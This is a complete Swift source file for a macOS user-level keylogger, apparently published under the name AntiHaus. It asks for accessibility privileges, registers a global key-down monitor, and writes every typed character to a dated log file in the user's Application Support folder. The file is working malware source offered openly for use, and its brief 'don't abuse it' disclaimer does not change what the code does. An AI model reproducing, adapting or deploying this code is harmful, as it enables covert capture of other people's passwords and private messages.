//
// SWIFT USER LEVEL KEYLOGGER - AntiHaus
//   _
// .~q`,
//{__,  \
//    \' \
//     \  \
//      \  \
//       \  `._            __.__
//        \    ~-._  _.==~~     ~~--.._
//         \        '                  ~-.
//          \      _-   -_                `.
//           \    /       }        .-    .  \
//            `. |      /  }      (       ;  \
//              `|     /  /       (       :   '\
//                \    |  /        |      /       \
//                 |     /`-.______.\     |^-.      \
//                 |   |/           (     |   `.      \_
//                 |   ||            ~\   \      '._    `-.._____..----..___
//                 |   |/             _\   \         ~-.__________.-~~~~~~~~~'''
//               .o'___/            .o______}

/* DISCLAIMER: AntiHaus ASSUMES NO LIABILITY WHATSOEVER AND DISCLAIMS ANY WARRANTY. THERE IS NO WARRANTY RELATING TO FITNESS FOR A PARTICULAR PURPOSE, MERCHANTABILITY, COPYRIGHT OR OTHER INTELLECTUAL PROPERTY RIGHT. */

/* THIS SOURCE IS PROVIDED AS IS. DON'T BE DICK. DON'T ABUSE IT OR OTHER PEOPLES PERSONAL COMPUTERS */

import Foundation
import Cocoa

// MARK: File Storage location.

private struct Constants {
    
    static let applicationDocumentsDirectoryName = "dk.logging.Logger"
    static let mainStoreFileName = "\(formatCurrentDateAsString()).txt"
    static let errorDomain = "CoreDataStackManager"
}

func formatCurrentDateAsString() -> String {
    let dateFormatter = DateFormatter()
    dateFormatter.dateFormat = "yyyy-MM-dd"
    let d = Date()
    let s = dateFormatter.string(from: d)
    return s
}

// MARK: check file directory for logs.

let fileManager = FileManager.default
let urls = fileManager.urls(for: .applicationSupportDirectory, in: .userDomainMask)
var applicationSupportDirectory = urls[urls.count - 1] as URL
applicationSupportDirectory = applicationSupportDirectory.appendingPathComponent(Constants.applicationDocumentsDirectoryName)

var URLinString = applicationSupportDirectory.absoluteString

let absoluteString = applicationSupportDirectory.absoluteString

let replaced = absoluteString.replacingOccurrences(of: "file://", with: "")

let fullApplicationSupportPathString = replaced.addingPercentEncoding(withAllowedCharacters: .urlHostAllowed)
var applicationDocumentsDirectory: URL? = {
    
    var error: NSError?
    do {
        let properties = try applicationSupportDirectory.resourceValues(forKeys: [URLResourceKey.isDirectoryKey])
            
        if let isDirectory = properties.isDirectory {
            
            if !isDirectory {
                
                let description = NSLocalizedString("Could not access the application data folder.", comment: "Failed to initialize applicationSupportDirectory")
                
                let reason = NSLocalizedString("Found a file in its place.", comment: "Failed to initialize applicationSupportDirectory")
                
                let userInfo = [
                    NSLocalizedDescriptionKey: description,
                    NSLocalizedFailureReasonErrorKey: reason
                ]
                
                error = NSError(domain: Constants.errorDomain, code: 101, userInfo: userInfo)
                print(error)
                fatalError("Could not access the application data folder.")
                
                return nil
            }
        }
        else {
            
        }
    }
    catch {
        print(error)
        if error != nil && error._code == NSFileReadNoSuchFileError {
            do {
                try FileManager.default.createDirectory(atPath: applicationSupportDirectory.path, withIntermediateDirectories: true, attributes: nil)
            } catch let error as NSError {
                print(error.localizedDescription);
            }
        }
    }
    
    return applicationSupportDirectory
}()

// MARK: Write stream to file

func logWriter(writeToLine: String) {
    
    let folder = applicationSupportDirectory.path + "/"
    let path = folder.appending(Constants.mainStoreFileName)
    
    print(path)
    print(writeToLine)
    if let outputStream = OutputStream(toFileAtPath: path, append: true) {
        outputStream.open()
        outputStream.write(writeToLine, encoding: String.Encoding.utf8, allowLossyConversion:true)
        outputStream.close()
    }
    else {
        print("Unable to open file")
    }
}

// MARK: Acquire Privleges

func acquirePrivileges() -> Bool {
    let accessEnabled = AXIsProcessTrustedWithOptions([kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true] as CFDictionary)
    
    if accessEnabled != true {
        print("You need to enable the keylogger in the System Prefrences")
    }
    
    return accessEnabled == true
}

// MARK: Key Input from EventHandler to file

func handlerEvent(aEvent: NSEvent) -> Void {
    let stringBuilder = aEvent.characters!
    logWriter(writeToLine: "\(stringBuilder)")
}

// MARK: Event Monitor

func listenForEvents() {
    let mask = (NSEvent.EventTypeMask.keyDown)
    let eventMonitor: Any? = NSEvent.addGlobalMonitorForEvents(matching: mask, handler: handlerEvent)
}

class ApplicationDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(_ notification: Notification) {
        print("Starting logging on \(formatCurrentDateAsString())")
        let _ = acquirePrivileges()
        listenForEvents()
    }
}


let application = NSApplication.shared

let applicationDelegate = ApplicationDelegate()
application.delegate = applicationDelegate
application.activate(ignoringOtherApps: true)
application.run()



